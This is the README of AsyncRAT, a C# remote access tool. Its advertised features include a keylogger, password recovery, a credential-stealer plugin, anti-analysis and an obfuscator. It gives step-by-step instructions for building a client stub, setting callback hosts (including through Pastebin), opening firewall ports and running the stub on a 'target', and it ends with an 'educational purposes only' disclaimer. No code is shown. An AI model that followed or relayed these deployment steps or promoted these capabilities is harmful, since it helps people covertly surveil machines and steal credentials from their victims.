<img src="https://i.imgur.com/KbomEco.png">

# AsyncRAT
AsyncRAT is a Remote Access Tool (RAT) designed to remotely monitor and control other computers through a secure encrypted connection

# Included projects
##### This project includes the following
- Plugin system to send and receive commands
- Access terminal for controlling clients
- Configurable client manageable via Terminal
- Log server recording all significant events

##### Features Include:
- Client screen viewer & recorder
- Client Antivirus & Integrity manager
- Client SFTP access including upload & download
- Client & Server chat window
- Client Dynamic DNS & Multi-Server support (Configurable)
- Client Password Recovery
- Client JIT compiler 
- Client Keylogger 
- Client Anti Analysis (Configurable)
- Server Controlled updates
- Client Antimalware Start-up 
- Server Config Editor
- Server multiport receiver (Configurable)
- Server thumbnails 
- Server binary builder (Configurable)
- Server obfuscator (Configurable)
- And much more!

### Technical Details
The following online servers / resources are used in this project
* [pastebin.com] - used for the "PasteBin" option in client builder
* [github.com] - used for downloading and uploading changes to the project
### Installation & Deployment

AsyncRAT requires the [.Net Framework](https://dotnet.microsoft.com/download/dotnet-framework/net46) v4 (client) and v4.6+ (server) to run.

```diff
- to compile this project(s) visual studio 2019 or above to is required
```

### Connecting Clients (agents)

1. Build and run the **Server** project in **Release** (the Builder is hidden in Debug). The main window has a top-menu item labeled **BUILDER**. Launch it from there to configure clients.
2. Run the server in Release once to choose the listening ports; this also generates `ServerCertificate.p12`. Keep that certificate next to the server and reuse it for every client you build (the builder now stops and warns if the certificate is missing).
3. In the Builder, add at least one host and one port using the **Add IP/Port** buttons (defaults fill to `127.0.0.1` and `6606` if empty). Ports must be numeric between `1-65535`; invalid or duplicate host/port entries are ignored with warnings. Use your public IP or DDNS name plus the same listening port(s). If these lists are empty the client will never attempt a connection.
4. For Pastebin-based configs, tick **Use Pastebin** and point to a raw HTTP/HTTPS paste formatted as `host:port1:port2` (host first, one or more ports separated by `:`). An empty or malformed paste results in "no host/port" and the agent will not run.
5. Forward or allow the chosen ports through your firewall/NAT so the server is reachable from the client machine.
6. Build the stub (ensure `Stub/Stub.exe` exists) and run it on the target. If the certificate matches and the port is reachable, the agent will appear in the server list.

#### Common connection issues
- No client shows up: the host/port lists were empty or invalid (ports outside `1-65535` or blank hosts), or the Pastebin entry lacked a host/port pair.
- Build blocked: `ServerCertificate.p12` missing. Start the server once in Release (Ports dialog) to generate it, then rebuild the client.
- Build button disabled: the builder auto-blocks when host/port inputs are invalid or when the stub/certificate is missing; check the status labels on the Connection and Build tabs.
- TLS handshake fails: the server certificate changed. Reuse the original `ServerCertificate.p12` or rebuild the client with the new certificate.
- Port unreachable: confirm the server is listening on the selected port and that firewall/router rules allow inbound TCP to it.

### Plugins
Currently the program makes use of several integrated DLL's (see below for more details)

| Plugin | Source |
| ------ | ------ |
| StealerLib | [gitlab.com/thoxy/stealerlib] |

### Download
[AsyncRAT-C-Sharp/releases](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/releases)

### Are you a C# or .Net Developer and want to contribute?
##### Great!
Please read through the project first to get an idea of how the program is structured first after which create a fork with your own changes and purpose a pull request as well a an issue referencing what you have changed, why you have changed it, and why / if you think it should be implemented

### Donation
##### Buy me a coffee!
BTC: 12DaUTCemhDEzNw7cAFg9FndzcWkYZt6C8

### LEGAL DISCLAIMER PLEASE READ!
##### I, the creator and all those associated with the development and production of this program are not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's intended purpose is NOT to be used maliciously, or on any system that you do not have own or have explicit permission to operate and use this program on. By using this software, you automatically agree to the above.

## License
[![License](http://img.shields.io/:license-mit-blue.svg?style=flat-square)](/LICENSE)
This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details
